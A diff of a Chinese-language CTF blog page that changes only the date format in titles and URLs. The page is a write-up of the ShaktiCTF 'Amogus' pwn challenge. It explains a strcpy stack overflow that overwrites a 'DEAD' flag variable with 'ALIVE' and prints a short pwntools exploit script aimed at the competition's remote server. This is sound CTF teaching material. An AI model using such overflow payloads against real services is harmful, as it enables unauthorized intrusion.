@@ -21,21 +21,21 @@
   
     <meta name="description" content="题目简介一道shaktictf比赛上的题目，链接在这7月26日shaktictf比赛：Amogus原题">
 <meta property="og:type" content="article">
-<meta property="og:title" content="2025.07.26-shaktictf-Amogus">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/index.html">
+<meta property="og:title" content="2025-07-26-shaktictf-Amogus">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/26/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/index.html">
 <meta property="og:site_name" content="0x4A">
 <meta property="og:description" content="题目简介一道shaktictf比赛上的题目，链接在这7月26日shaktictf比赛：Amogus原题">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/main.png">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/gameplay.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/main.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/gameplay.png">
 <meta property="article:published_time" content="2025-07-26T07:56:36.000Z">
-<meta property="article:modified_time" content="2025-09-03T13:28:22.460Z">
+<meta property="article:modified_time" content="2025-09-28T10:46:06.000Z">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/main.png">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/main.png">
   
   
   
-  <title>2025.07.26-shaktictf-Amogus - 0x4A</title>
+  <title>2025-07-26-shaktictf-Amogus - 0x4A</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -189,7 +189,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="2025.07.26-shaktictf-Amogus"></span>
+            <span id="subtitle" data-typed-text="2025-07-26-shaktictf-Amogus"></span>
           
         </div>
 
@@ -260,7 +260,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">2025.07.26-shaktictf-Amogus</h1>
+            <h1 id="seo-header">2025-07-26-shaktictf-Amogus</h1>
             
             
               <div class="markdown-body">
@@ -268,7 +268,7 @@
                 <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道shaktictf比赛上的题目，链接在这<a target="_blank" rel="noopener" href="https://ctf.teamshakti.in/challenge/41">7月26日shaktictf比赛：Amogus原题</a></p>
 <span id="more"></span>
 <p>原本的英文题目描述如下：<br><br>I always end up dying in this Amogus game… before I even get a chance to properly play! Ugh!<br><br>Is there any way I can escape this cruel fate?<br><br>大概意思就是目标二进制程序是模拟一个游戏，但是每次一开始就会死亡，需要我们找到办法正确启动游戏（避免死亡）<br></p>
-<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>反正光看描述是云里雾里的，只能猜到应该是要绕过一个什么验证<br><br>于是直接把附件给的ELF拖到IDA里面看下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/main.png" srcset="/img/loading.gif" lazyload><br>首先如上图，在IDA里观察main函数调用了一个gameplay函数，联想到题目描述，导致“死亡”的元凶应该在这个gameplay里面，追踪进去看一下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025.07.26-shaktictf-Amogus/gameplay.png" srcset="/img/loading.gif" lazyload><br>分析这个函数可以发现，需要v4变量&#x3D;”ALIVE”才能获得flag，但是在校验之前v4有一个将”DEAD”拷贝给v4的操作，看起来似乎v4必定会&#x3D;“DEAD”<br><br>但是，注意到第11行的字符串拷贝语句，由于strcpy不会检查长度，而是遇到0字节停止，而恰好dest缓冲区在v4下方，而参数a1又是攻击者可控的，因此可以通过dest溢出将v4覆盖为”ALIVE”<br></p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>反正光看描述是云里雾里的，只能猜到应该是要绕过一个什么验证<br><br>于是直接把附件给的ELF拖到IDA里面看下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/main.png" srcset="/img/loading.gif" lazyload><br>首先如上图，在IDA里观察main函数调用了一个gameplay函数，联想到题目描述，导致“死亡”的元凶应该在这个gameplay里面，追踪进去看一下：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/2025-07-26-shaktictf-Amogus/gameplay.png" srcset="/img/loading.gif" lazyload><br>分析这个函数可以发现，需要v4变量&#x3D;”ALIVE”才能获得flag，但是在校验之前v4有一个将”DEAD”拷贝给v4的操作，看起来似乎v4必定会&#x3D;“DEAD”<br><br>但是，注意到第11行的字符串拷贝语句，由于strcpy不会检查长度，而是遇到0字节停止，而恰好dest缓冲区在v4下方，而参数a1又是攻击者可控的，因此可以通过dest溢出将v4覆盖为”ALIVE”<br></p>
 <h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>dest缓冲区16个字节，只需要填满dest缓冲区，再加上”ALIVE”，最后以0字节截断即可<br><br>由此构造的payload&#x3D;b’1’*16+b”ALIVE”+b’\x00’，最终的利用脚本如下：<br></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br><span class="hljs-comment"># ioTube=process(targetELF)</span><br>ioTube=remote(<span class="hljs-string">&quot;43.205.113.100&quot;</span>,<span class="hljs-number">8027</span>)<br>payload=<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&quot;ALIVE&quot;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span><br>ioTube.recvuntil(<span class="hljs-string">&quot;Enter your name:\n\n&quot;</span>)<br>ioTube.sendline(payload)<br>response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure>
                 
@@ -315,8 +315,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>2025.07.26-shaktictf-Amogus</div>
-      <div>http://0x4a-210.github.io/2025/07/26/pwn刷题记录/其他技巧类/2025.07.26-shaktictf-Amogus/</div>
+      <div>2025-07-26-shaktictf-Amogus</div>
+      <div>http://0x4a-210.github.io/2025/07/26/pwn刷题记录/其他技巧类/2025-07-26-shaktictf-Amogus/</div>
     </div>
     <div class="license-meta">
       
